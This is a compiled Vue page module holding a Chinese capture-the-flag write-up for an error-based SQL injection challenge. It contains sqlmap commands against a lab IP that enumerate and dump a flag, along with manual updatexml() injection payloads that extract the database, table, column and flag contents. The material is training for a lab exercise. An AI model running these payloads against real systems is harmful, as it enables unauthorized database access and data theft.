import{_ as s,o as a,c as n,e}from"./app-91d1060a.js";const p={},t=e(`<p>#SQL 注入 #报错注入</p><p>可以用 sqlmap 跑 👍</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>sqlmap <span class="token parameter variable">-u</span> “http://1.14.71.254:28199/index.php?id<span class="token operator">=</span><span class="token number">1</span>” <span class="token parameter variable">--dbs</span>
sqlmap <span class="token parameter variable">-u</span> “http://1.14.71.254:28199/index.php?id<span class="token operator">=</span><span class="token number">1</span>” <span class="token parameter variable">-D</span> test_db <span class="token parameter variable">--tables</span>
sqlmap <span class="token parameter variable">-u</span> “http://1.14.71.254:28199/index.php?id<span class="token operator">=</span><span class="token number">1</span>” <span class="token parameter variable">-D</span> test_db <span class="token parameter variable">-T</span> test_tb <span class="token parameter variable">--columns</span>
sqlmap <span class="token parameter variable">-u</span> “http://1.14.71.254:28199/index.php?id<span class="token operator">=</span><span class="token number">1</span>” <span class="token parameter variable">-D</span> test_db <span class="token parameter variable">-T</span> test_tb <span class="token parameter variable">-C</span> flag <span class="token parameter variable">--dump</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>报错注入 尝试</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token comment">-- 获取当前数据库</span>

?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">&#39; and updatexml(1,concat(&#39;</span><span class="token operator">~</span><span class="token string">&#39;,(select database()),&#39;</span><span class="token operator">~</span>&#39;<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">--+</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>![[Pasted image 20230130170645.png]]</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token comment">-- 获取表</span>

?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">&#39; and updatexml(1,concat(&#39;</span><span class="token operator">~</span><span class="token string">&#39;,(select table_name from information_schema.tables where table_schema=&#39;</span>test_db<span class="token string">&#39; limit 0,1),&#39;</span><span class="token operator">~</span>&#39;<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">--+</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>![[Pasted image 20230130170921.png]]</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token comment">-- 获取列</span>

?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">&#39; and updatexml(1,concat(&#39;</span><span class="token operator">~</span><span class="token string">&#39;,(select column_name from information_schema.columns where table_name=&#39;</span>test_tb<span class="token string">&#39; limit 1,1),&#39;</span><span class="token operator">~</span>&#39;<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">--+</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>![[Pasted image 20230130171704.png]]</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token comment">-- 获取字段</span>

?id<span class="token operator">=</span><span class="token number">1</span>&#39; <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> flag <span class="token keyword">from</span> test_tb<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>

<span class="token number">0x7e</span> : <span class="token operator">~</span>     <span class="token operator">%</span><span class="token number">23</span> : <span class="token comment">#</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>只有一半，接着就用 right()、left()函数截取就 OK</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">1</span>&#39; <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">right</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token keyword">from</span> test_tb<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div>`,13),l=[t];function o(c,r){return a(),n("div",null,l)}const u=s(p,[["render",o],["__file","error.html.vue"]]);export{u as default};
